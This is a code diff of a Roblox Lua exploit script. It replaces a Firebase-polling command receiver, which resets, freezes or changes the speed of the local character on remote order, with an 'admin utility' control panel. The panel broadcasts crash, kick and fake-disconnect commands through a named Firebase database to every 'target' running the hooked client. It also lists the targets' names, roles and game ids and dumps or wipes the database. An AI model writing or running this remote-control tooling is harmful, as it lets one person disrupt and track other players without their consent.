@@ -1,248 +1,157 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
 
-local Config = {
-    FIREBASE_URL = "https://your-database-id.firebaseio.com/data.json",
-    POLL_INTERVAL = 1.5,
-    COMMAND_TIMEOUT = 15,
-    MAX_CACHE_SIZE = 100
-}
+local function req(method, url, body)
+    local r = (syn and syn.request) or (http and http.request) or http_request or request
+    if not r then return nil end
+    local ok, res = pcall(r, {Url=url, Method=method, Headers=body and {["Content-Type"]="application/json"} or {}, Body=body})
+    return ok and res or nil
+end
 
-local Logger = {
-    Write = function(self, category, level, message)
-        local timestamp = os.date("%H:%M:%S")
-        print(string.format("[%s] [%s] [%s]: %s", timestamp, category:upper(), level:upper(), message))
+local function get(url)
+    local r = req("GET", url)
+    if r and r.StatusCode == 200 then return r.Body end
+    local ok, b = pcall(game.HttpGet, game, url)
+    return ok and b or nil
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "AdminUtil"; gui.ResetOnSpawn = false
+if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
+    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 280, 0, 380)
+main.Position = UDim2.new(0.5, -140, 0.5, -190)
+main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+main.Active = true; main.Draggable = true
+
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 6)
+
+local bar = Instance.new("Frame", main)
+bar.Size = UDim2.new(1, 0, 0, 28)
+bar.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)
+
+local ttl = Instance.new("TextLabel", bar)
+ttl.Size = UDim2.new(1, -10, 1, 0); ttl.Position = UDim2.new(0, 8, 0, 0)
+ttl.BackgroundTransparency = 1; ttl.Text = "ADMIN UTILITY"
+ttl.TextColor3 = Color3.fromRGB(0, 255, 150); ttl.Font = Enum.Font.Code; ttl.TextSize = 12
+ttl.TextXAlignment = Enum.TextXAlignment.Left
+
+local scroll = Instance.new("ScrollingFrame", main)
+scroll.Size = UDim2.new(0.9, 0, 1, -36)
+scroll.Position = UDim2.new(0.05, 0, 0, 32)
+scroll.BackgroundTransparency = 1
+scroll.CanvasSize = UDim2.new(0, 0, 0, 460)
+scroll.ScrollBarThickness = 3
+
+local list = Instance.new("UIListLayout", scroll)
+list.Padding = UDim.new(0, 5)
+
+local status = Instance.new("TextLabel", scroll)
+status.Size = UDim2.new(1, 0, 0, 18); status.BackgroundTransparency = 1
+status.Text = "Ready"; status.TextColor3 = Color3.fromRGB(120,120,120)
+status.Font = Enum.Font.Code; status.TextSize = 10; status.TextXAlignment = Enum.TextXAlignment.Left
+
+local function log(msg) status.Text = os.date("%H:%M:%S") .. " > " .. msg end
+
+local function btn(text, color, cb)
+    local b = Instance.new("TextButton", scroll)
+    b.Size = UDim2.new(1, 0, 0, 30)
+    b.BackgroundColor3 = color
+    b.Text = text; b.TextColor3 = Color3.fromRGB(255,255,255)
+    b.Font = Enum.Font.SourceSansBold; b.TextSize = 11
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
+    b.MouseButton1Click:Connect(cb)
+end
+
+btn("EMERGENCY STOP ALL", Color3.fromRGB(180, 40, 40), function()
+    local cmds = {}
+    for _, c in ipairs({"unfreeze", "unspasm", "unblind", "antiy"}) do
+        table.insert(cmds, {id = HttpService:GenerateGUID(false), command = c, target = "all", message = "", timestamp = os.time()})
     end
-}
+    req("POST", FIREBASE_URL .. "commands/all.json", HttpService:JSONEncode(cmds))
+    log("Emergency stop broadcast sent")
+end)
 
-local Context = {
-    Config = Config,
-    LocalPlayer = LocalPlayer
-}
-
-function Context:GetLiveState()
-    local char = LocalPlayer.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    
-    return {
-        Character = char,
-        Humanoid = hum,
-        RootPart = root,
-        IsAlive = (hum and hum.Health > 0) == true
-    }
-end
-
-local CacheManager = { Map = {}, Queue = {}, Head = 1 }
-
-function CacheManager:IsDuplicate(id)
-    return self.Map[id] == true
-end
-
-function CacheManager:Mark(id)
-    if not id or self.Map[id] then return end
-    
-    local head = self.Head
-    local oldId = self.Queue[head]
-    
-    if oldId then
-        self.Map[oldId] = nil
-    end
-    
-    self.Queue[head] = id
-    self.Map[id] = true
-    
-    self.Head = (head % Config.MAX_CACHE_SIZE) + 1
-end
-
-local Registry = { _storage = {} }
-
-function Registry:Register(commandName, definition)
-    definition.Aliases = definition.Aliases or {}
-    definition.Requirements = definition.Requirements or {}
-    
-    self._storage[commandName:lower()] = definition
-    for _, alias in ipairs(definition.Aliases) do
-        self._storage[alias:lower()] = definition
-    end
-end
-
-function Registry:Get(commandName)
-    if type(commandName) ~= "string" then return nil end
-    return self._storage[commandName:lower()]
-end
-
-local Handlers = {}
-
-function Handlers.Reset(ctx, liveState, payload)
-    liveState.Humanoid.Health = 0
-    return true, "Character core forced to respawn"
-end
-
-function Handlers.Freeze(ctx, liveState, payload)
-    liveState.RootPart.Anchored = true
-    return true, "Physical position anchored"
-end
-
-function Handlers.Unfreeze(ctx, liveState, payload)
-    liveState.RootPart.Anchored = false
-    return true, "Physical position released"
-end
-
-function Handlers.WalkSpeed(ctx, liveState, payload)
-    local targetSpeed = tonumber(payload.message) or 16
-    liveState.Humanoid.WalkSpeed = targetSpeed
-    return true, "Walkspeed adjusted to " .. targetSpeed
-end
-
-Registry:Register("reset", {
-    Name = "Reset", 
-    Description = "Mereset karakter.", 
-    Requirements = { Humanoid = true, Alive = true }, 
-    Handler = Handlers.Reset
-})
-
-Registry:Register("freeze", {
-    Name = "Freeze", 
-    Description = "Mengunci posisi.", 
-    Aliases = { "anchor" }, 
-    Requirements = { Root = true }, 
-    Handler = Handlers.Freeze
-})
-
-Registry:Register("unfreeze", {
-    Name = "Unfreeze", 
-    Description = "Membuka posisi.", 
-    Aliases = { "unanchor" }, 
-    Requirements = { Root = true }, 
-    Handler = Handlers.Unfreeze
-})
-
-Registry:Register("walkspeed", {
-    Name = "WalkSpeed", 
-    Description = "Mengatur kecepatan.", 
-    Aliases = { "ws", "speed" }, 
-    Requirements = { Humanoid = true }, 
-    Handler = Handlers.WalkSpeed
-})
-
-local Dispatcher = {}
-
-local RequirementValidators = {
-    Character = function(d) 
-        return d.Character ~= nil and d.Character:IsDescendantOf(workspace), "Character missing from workspace" 
-    end,
-    Humanoid  = function(d) 
-        return d.Humanoid ~= nil and d.Humanoid:IsDescendantOf(workspace), "Humanoid missing from workspace" 
-    end,
-    Root      = function(d) 
-        return d.RootPart ~= nil and d.RootPart:IsDescendantOf(workspace), "HumanoidRootPart missing from workspace" 
-    end,
-    Alive     = function(d) 
-        return d.IsAlive == true, "Execution denied: Character is dead" 
-    end
-}
-
-function Dispatcher:Route(payload, ctx)
-    if type(payload) ~= "table" or not payload.id or not payload.command then return end
-    
-    local commandTime = tonumber(payload.timestamp) or 0
-    if commandTime > 9999999999 then 
-        commandTime = commandTime / 1000 
-    end
-    
-    local timeDiff = os.time() - commandTime
-    if timeDiff > Config.COMMAND_TIMEOUT then 
-        return Logger:Write("Dispatcher", "Warn", string.format("Command '%s' dropped: Stale by %ds", payload.command, timeDiff)) 
-    end
-    
-    if CacheManager:IsDuplicate(payload.id) then return end
-    CacheManager:Mark(payload.id)
-    
-    local cmdDef = Registry:Get(payload.command)
-    if not cmdDef then 
-        return Logger:Write("Dispatcher", "Warn", "No registered handler for: " .. tostring(payload.command)) 
-    end
-    
-    local liveState = ctx:GetLiveState()
-    for reqName, isRequired in pairs(cmdDef.Requirements) do
-        if isRequired then
-            local passed, err = RequirementValidators[reqName](liveState)
-            if not passed then 
-                return Logger:Write("Executor", "Failed", string.format("[%s] Requirement failed: %s", cmdDef.Name, err)) 
+btn("WIPE ALL COMMANDS", Color3.fromRGB(140, 70, 20), function()
+    req("PUT", FIREBASE_URL .. "commands/all.json", "{}")
+    pcall(function()
+        local raw = get(FIREBASE_URL .. "players.json")
+        if raw and raw ~= "null" then
+            for name, _ in pairs(HttpService:JSONDecode(raw)) do
+                req("PUT", FIREBASE_URL .. "commands/" .. name .. ".json", "{}")
             end
         end
-    end
-    
-    local success, cmdOk, msg = pcall(cmdDef.Handler, ctx, liveState, payload)
-    if success and cmdOk then
-        Logger:Write("Executor", "Success", string.format("[%s] -> %s", cmdDef.Name, msg))
-    else
-        Logger:Write("Executor", "Error", string.format("[%s] Runtime crash: %s", cmdDef.Name, tostring(msg)))
-    end
-end
-
-function Dispatcher:ProcessFrame(dataFrame, ctx)
-    if type(dataFrame) ~= "table" then return end
-    if dataFrame.id ~= nil then
-        self:Route(dataFrame, ctx)
-    else
-        for _, subPayload in pairs(dataFrame) do
-            if type(subPayload) == "table" and subPayload.id ~= nil then
-                self:Route(subPayload, ctx)
-            end
-        end
-    end
-end
-
-local Network = {}
-
-function Network:FetchPayload(url)
-    local req = (syn and syn.request) or (http and http.request) or http_request or request
-    if req then
-        local success, res = pcall(req, { Url = url, Method = "GET" })
-        if success and res and res.StatusCode == 200 then
-            return res.Body
-        end
-    end
-    
-    local success, body = pcall(function()
-        return game:HttpGet(url)
     end)
-    if success and body then return body end
-    
-    local successAsync, bodyAsync = pcall(function()
-        return HttpService:GetAsync(url)
-    end)
-    if successAsync and bodyAsync then return bodyAsync end
-    
-    return nil
-end
+    log("All command endpoints wiped")
+end)
 
-local function Main()
-    Logger:Write("System", "Info", "Boot sequence completed. Engine is active.")
-    
-    while true do
-        local rawJson = Network:FetchPayload(Config.FIREBASE_URL)
-        
-        if rawJson and rawJson ~= "null" then
-            local decodeOk, parsedTree = pcall(HttpService.JSONDecode, HttpService, rawJson)
-            
-            if decodeOk and type(parsedTree) == "table" then
-                local frameContext = Context
-                
-                if parsedTree.all then 
-                    Dispatcher:ProcessFrame(parsedTree.all, frameContext) 
-                end
-                if parsedTree[LocalPlayer.Name] then 
-                    Dispatcher:ProcessFrame(parsedTree[LocalPlayer.Name], frameContext) 
-                end
+btn("WIPE PLAYER REGISTRY", Color3.fromRGB(120, 30, 30), function()
+    req("PUT", FIREBASE_URL .. "players.json", "{}")
+    log("Player registry wiped")
+end)
+
+btn("CRASH ALL TARGETS", Color3.fromRGB(160, 0, 0), function()
+    req("POST", FIREBASE_URL .. "commands/all.json", HttpService:JSONEncode({
+        id = HttpService:GenerateGUID(false), command = "crash", target = "all", message = "", timestamp = os.time()
+    }))
+    log("Crash broadcast sent")
+end)
+
+btn("KICK ALL TARGETS", Color3.fromRGB(130, 15, 15), function()
+    req("POST", FIREBASE_URL .. "commands/all.json", HttpService:JSONEncode({
+        id = HttpService:GenerateGUID(false), command = "exit", target = "all", message = "", timestamp = os.time()
+    }))
+    log("Exit broadcast sent")
+end)
+
+btn("FAKE DISCONNECT ALL", Color3.fromRGB(100, 50, 15), function()
+    req("POST", FIREBASE_URL .. "commands/all.json", HttpService:JSONEncode({
+        id = HttpService:GenerateGUID(false), command = "fakedisconnect", target = "all", message = "", timestamp = os.time()
+    }))
+    log("Fake disconnect broadcast sent")
+end)
+
+btn("LIST ONLINE PLAYERS", Color3.fromRGB(30, 90, 50), function()
+    pcall(function()
+        local raw = get(FIREBASE_URL .. "players.json")
+        if raw and raw ~= "null" then
+            local players = HttpService:JSONDecode(raw)
+            local n = 0
+            for _, info in pairs(players) do
+                n = n + 1
+                print(string.format("[Admin] %s [%s] @ %s (%s)", info.name, info.role, info.placeName or "?", info.gameId or "?"))
             end
-        end
-        
-        task.wait(Config.POLL_INTERVAL)
-    end
-end
+            log(n .. " players — check F9 console")
+        else log("No players registered") end
+    end)
+end)
 
-task.spawn(Main)
+btn("DUMP RAW DATABASE", Color3.fromRGB(50, 50, 90), function()
+    pcall(function() print("[Admin] commands/all.json:", get(FIREBASE_URL .. "commands/all.json") or "null") end)
+    pcall(function() print("[Admin] players.json:", get(FIREBASE_URL .. "players.json") or "null") end)
+    log("Raw dump printed to F9")
+end)
+
+btn("WIPE SPECIFIC PLAYER COMMANDS", Color3.fromRGB(90, 60, 25), function()
+    pcall(function()
+        local raw = get(FIREBASE_URL .. "players.json")
+        if raw and raw ~= "null" then
+            local players = HttpService:JSONDecode(raw)
+            local names = {}
+            for name, _ in pairs(players) do table.insert(names, name) end
+            table.sort(names)
+            for i, name in ipairs(names) do
+                print(string.format("[%d] %s", i, name))
+            end
+            print("\nCopy a name and run in console:")
+            print('req("PUT", "' .. FIREBASE_URL .. 'commands/PLAYERNAME.json", "{}")')
+            log("Names printed to F9 — use console to wipe")
+        end
+    end)
+end)
